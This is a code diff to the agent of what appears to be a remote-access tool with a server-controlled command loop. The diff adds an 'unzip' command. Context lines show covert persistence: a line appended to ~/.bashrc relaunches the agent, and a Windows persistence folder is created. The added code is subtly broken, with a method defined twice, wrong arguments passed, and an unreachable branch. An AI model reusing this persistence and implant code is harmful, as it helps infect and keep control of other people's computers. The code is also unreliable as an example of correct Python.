@@ -204,6 +204,7 @@ class Agent(object):
             else:
                 with open(self.expand_path("~/.bashrc"), "a") as f:
                     f.write("\n(if [ $(ps aux|grep " + os.path.basename(sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
+
         elif platform.system() == 'Windows':
             persist_dir = os.path.join(os.getenv('USERPROFILE'), 'ares')
             if not os.path.exists(persist_dir):
@@ -259,7 +260,26 @@ class Agent(object):
             self.send_output("[+] Archive created: %s" % zip_name)
         except Exception as exc:
             self.send_output(traceback.format_exc())
+
+    def extract_zip(self,zip_name):
+        self.extract_zip(self,zip_name,os.path.dirname(zip_name))
    
+    @threaded
+    def extract_zip(self,zip_name,destination):
+        """ Unzips a zip file in the current directory """
+        try:
+            zip_name = self.expand_path(zip_name)
+            if not os.path.exists(zip_name):
+                self.send_output("[+] No such zip file: %s"% zip_name)
+                return
+            self.send_output("[*] Starting zip extraction...")
+            zip_file = zipfile.ZipFile(zip_name)
+            zip_file.extractall(destination)
+            zip_file.close()
+            self.send_output("[+] Extracted archive: %s" % zip_name)
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
+
     @threaded
     def screenshot(self):
         """ Takes a screenshot and uploads it to the server"""
@@ -323,6 +343,13 @@ class Agent(object):
                             self.persist()
                         elif command == 'exit':
                             self.exit()
+                        elif command == "unzip":
+                            if not args or len(args) < 2:
+                                self.send_output("usage: unzip <archive_name> <destination> or unzip <archive_name>")
+                            elif len(args) == 1:
+                                self.extract_zip(" ".join(args))
+                            else:
+                                self.extract_zip(args[0]," ".join(args[1:]))
                         elif command == 'zip':
                             if not args or len(args) < 2:
                                 self.send_output('usage: zip <archive_name> <folder>')
